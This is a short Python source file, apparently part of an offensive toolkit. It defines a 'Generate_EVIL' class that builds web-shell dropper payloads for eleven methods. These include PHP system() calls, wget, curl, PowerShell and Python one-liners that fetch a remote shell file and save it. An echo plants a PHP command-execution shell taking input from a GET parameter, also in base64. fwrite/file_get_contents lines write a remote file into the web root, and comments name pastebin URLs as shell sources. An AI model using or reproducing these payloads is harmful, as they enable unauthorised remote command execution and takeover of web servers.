import base64

class Generate_EVIL:
    def __init__(self, METHOD_PAYLOAD, URL_SHELL, FILENAME_SHELL):
        self.method = METHOD_PAYLOAD
        self.shell_host = URL_SHELL 
        self.shell_named = FILENAME_SHELL

    def converted_base64(self, php_code: str) -> str:
        encoded = base64.b64encode(php_code.encode('utf-8'))
        return encoded.decode('utf-8')

    def RAW_Name(self):
        return str(self.shell_host).split('raw/')[-1]

    # def EVILPHP_FWRITE(self.shell_host, self.shell_named):
    #     return f"fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/{self.shell_named}','w+'),file_get_contents('{self.shell_host}'));" #fwrite_php method
    #eval("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/error_log.php','w+'),file_get_contents('https://pastebin.com/raw/0xg3wt8U'));");

    def Shell_Generated(self):
        PasteName = self.RAW_Name()
     
        payload_lists = {
            "systemphp" : f'<?php system("curl -O {self.shell_host}"); system("mv {PasteName} {self.shell_named}"); ?>', #replace move (win) to mv (linux)
            "systemphp_win" : f'<?php system("curl -O {self.shell_host}"); system("move {PasteName} {self.shell_named}"); ?>', #win version
            "wget": f"wget {self.shell_host} -O {self.shell_named}",
            "curl": f"curl -o {self.shell_named} {self.shell_host}",
            "phpc": f"php -r \"copy('{self.shell_host}','{self.shell_named}');\"",
            "powershell": f"powershell -Command \"(New-Object Net.WebClient).DownloadFile('{self.shell_host}', '{self.shell_named}')\"",
            
            "python" :f"""py -c "import requests; r = requests.get('{self.shell_host}', headers={{'User-Agent': 'Mozilla/5.0'}}); open('{self.shell_named}', 'w', encoding='utf-8').write(r.text)" """,
            "echo_drop": f'''echo "<?php system($_GET['cmd']); ?>" > {self.shell_named}''',
            "echo_base64": f"""echo {self.converted_base64("<?php system($_GET['cmd']); ?>")} > {self.shell_named}""",  # base64 of simple RCE shell

            #JCE_COM Method  
            "fwrite_eval": f"eval(fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/{self.shell_named}','w+'),file_get_contents('{self.shell_host}')));",
            "fwrite_php": f"<?php fwrite(fopen('{self.shell_named}', 'w+'),file_get_contents('{self.shell_host}')); ?>"       
            
            #Thank for method https://gist.github.com/kuldeep1337/820ac7b420e9a19f5194503369f1301e
            #fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/rxr.php','w+'),file_get_contents('https://pastebin.com/raw/KfhBrjRb')); 
        }

        if self.method not in payload_lists:
            # print(f"[-] Method '{method}' not supported.")
        
            return 

        return payload_lists[self.method]
    
METHODS = [
    "systemphp",
    "systemphp_win",
    "wget",
    "curl",
    "phpc",
    "powershell",
    "python",
    "echo_drop",
    "echo_base64",
    "fwrite_eval",
    "fwrite_php",
]